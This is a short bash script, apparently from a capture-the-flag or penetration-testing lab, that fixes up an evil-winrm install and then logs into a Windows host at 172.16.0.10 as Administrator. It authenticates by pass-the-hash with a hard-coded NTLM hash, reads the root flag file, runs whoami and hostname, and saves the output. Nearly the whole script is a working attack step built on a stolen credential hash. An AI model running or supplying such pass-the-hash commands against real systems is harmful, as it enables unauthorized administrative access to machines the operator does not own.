#!/bin/bash
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
export GEM_HOME="$HOME/.local/share/gem/ruby/3.3.0"
SPEC="$HOME/.local/share/gem/ruby/3.3.0/specifications/evil-winrm-3.9.gemspec"
[ -f "$SPEC" ] && sed -i '/syslog/d' "$SPEC"
printf 'type C:\\Users\\Administrator\\Desktop\\root.txt\nwhoami\nhostname\nexit\n' | evil-winrm -i 172.16.0.10 -u Administrator -H "890b9e96245f6895e06adfe92ad1e81f" 2>&1 | tee /tmp/rootflag.out
echo ROOT_DONE
